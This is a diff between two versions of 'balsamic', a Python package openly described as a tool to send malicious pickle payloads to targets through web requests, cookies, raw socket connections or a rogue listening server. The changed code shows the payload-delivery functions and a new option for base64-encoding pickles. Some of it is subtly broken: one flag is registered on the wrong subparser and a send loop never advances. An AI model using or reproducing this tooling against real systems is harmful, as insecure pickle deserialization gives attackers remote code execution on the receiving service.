# Comparing `tmp/balsamic-0.1.7.tar.gz` & `tmp/balsamic-0.1.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "balsamic-0.1.7.tar", last modified: Sat May 18 02:36:13 2024, max compression
+gzip compressed data, was "balsamic-0.1.8.tar", last modified: Sat May 18 02:46:42 2024, max compression
```

## Comparing `balsamic-0.1.7.tar` & `balsamic-0.1.8.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:36:13.068690 balsamic-0.1.7/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2138 2024-05-18 02:36:13.068690 balsamic-0.1.7/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1604 2024-05-17 23:29:20.000000 balsamic-0.1.7/README.md
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:36:13.068690 balsamic-0.1.7/balsamic/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.7/balsamic/__innit__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2064 2024-05-17 23:34:22.000000 balsamic-0.1.7/balsamic/__main__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1515 2024-05-18 02:35:38.000000 balsamic-0.1.7/balsamic/balsamic.py
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:36:13.068690 balsamic-0.1.7/balsamic.egg-info/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2138 2024-05-18 02:36:13.000000 balsamic-0.1.7/balsamic.egg-info/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 02:36:13.000000 balsamic-0.1.7/balsamic.egg-info/SOURCES.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 02:36:13.000000 balsamic-0.1.7/balsamic.egg-info/dependency_links.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:36:13.000000 balsamic-0.1.7/balsamic.egg-info/requires.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:36:13.000000 balsamic-0.1.7/balsamic.egg-info/top_level.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 02:36:13.068690 balsamic-0.1.7/setup.cfg
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1143 2024-05-18 02:35:50.000000 balsamic-0.1.7/setup.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:46:42.797123 balsamic-0.1.8/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2138 2024-05-18 02:46:42.797123 balsamic-0.1.8/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1604 2024-05-17 23:29:20.000000 balsamic-0.1.8/README.md
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:46:42.797123 balsamic-0.1.8/balsamic/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.8/balsamic/__innit__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2200 2024-05-18 02:41:18.000000 balsamic-0.1.8/balsamic/__main__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1579 2024-05-18 02:43:55.000000 balsamic-0.1.8/balsamic/balsamic.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:46:42.797123 balsamic-0.1.8/balsamic.egg-info/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2138 2024-05-18 02:46:42.000000 balsamic-0.1.8/balsamic.egg-info/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 02:46:42.000000 balsamic-0.1.8/balsamic.egg-info/SOURCES.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 02:46:42.000000 balsamic-0.1.8/balsamic.egg-info/dependency_links.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:46:42.000000 balsamic-0.1.8/balsamic.egg-info/requires.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:46:42.000000 balsamic-0.1.8/balsamic.egg-info/top_level.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 02:46:42.797123 balsamic-0.1.8/setup.cfg
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1143 2024-05-18 02:46:10.000000 balsamic-0.1.8/setup.py
```

### Comparing `balsamic-0.1.7/PKG-INFO` & `balsamic-0.1.8/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.7
+Version: 0.1.8
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.1.7/README.md` & `balsamic-0.1.8/README.md`

 * *Files identical despite different names*

### Comparing `balsamic-0.1.7/balsamic/__main__.py` & `balsamic-0.1.8/balsamic/__main__.py`

 * *Files 10% similar despite different names*

```diff
@@ -25,21 +25,23 @@
 		#create subparser for socksend attack
 		socksendparser=subparse.add_parser("socksend")
 		socksendparser.add_argument("-rh","--rhost",required=True)
 		socksendparser.add_argument("-rp","--rport",required=True)
 		socksendparser.add_argument("-P","--payload",required=True)
 		socksendparser.add_argument("-c","--command")
 		socksendparser.add_argument("-s","--steps",default="0")
+		socksendparser.add_argument("-e","--encode",action="store_true")
 
 		#create subparser for socklisten attack
 		socklistenparser=subparse.add_parser("socklisten")
 		socklistenparser.add_argument("-lp","--lport",required=True)
 		socklistenparser.add_argument("-P","--payload",required=True)
 		socklistenparser.add_argument("-c","--command")
 		socklistenparser.add_argument("-s","--steps",default="0")
+		socksendparser.add_argument("-e","--encode",action="store_true")
 		
 		#return parsed arguments
 		args = parser.parse_args()
 		return args
 
 	args=parser()
 	if args.command:
```

### Comparing `balsamic-0.1.7/balsamic/balsamic.py` & `balsamic-0.1.8/balsamic/balsamic.py`

 * *Files 6% similar despite different names*

```diff
@@ -33,32 +33,36 @@
 			data={param:payload}
 			r(f"{schema}://{rhost}:{rport}",data=data)
 	else:
 		cookie={cook:payload.decode("utf-8")}
 		r(f"{schema}://{rhost}:{rport}",cookies=cookie)
 	return f"firing webreq attack against {schema}://{rhost} "
 
-def socksend(rhost,rport,payload, steps=0):
+def socksend(rhost,rport,payload, enc, steps=0):
 	rport=int(rport)
 	steps=int(steps)
+	if enc:
+		payload=utility.b64pickle(payload)
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 		s.connect((rhost,rport))
 		i=0
 		while i < steps:
 			s.sendall("arb".encode("utf-8"))
-		s.sendall(utility.b64pickle(payload))
+		s.sendall(payload)
 		s.recv(1024)
-def socklisten(lport,payload, steps=0):
+def socklisten(lport,payload, enc, steps=0):
 	lport=int(lport)
 	steps=int(steps)
+	if enc:
+		payload=utility.b64pickle(payload)
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 		s.bind(("",lport))
 		s.listen(1)
 		conn, addr = s.accept()
 		i=0
 		with conn:
 			while i < steps:
 				conn.sendall("arb".encode("utf-8"))
 				i+=1
-			conn.sendall(utility.b64pickle(payload))
+			conn.sendall(payload)
 			conn.recv(1024)
```

### Comparing `balsamic-0.1.7/balsamic.egg-info/PKG-INFO` & `balsamic-0.1.8/balsamic.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.7
+Version: 0.1.8
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.1.7/setup.py` & `balsamic-0.1.8/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -3,15 +3,15 @@
 import os
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-VERSION = '0.1.7'
+VERSION = '0.1.8'
 DESCRIPTION = 'Send malicious pickles via requests or sockets'
 LONG_DESCRIPTION = 'A package that allows the user to easily send out malicious pickles, via web requests, or a malicious server or client(currently ipv4 only)'
 
 # Setting up
 setup(
     name="balsamic",
     version=VERSION,
```

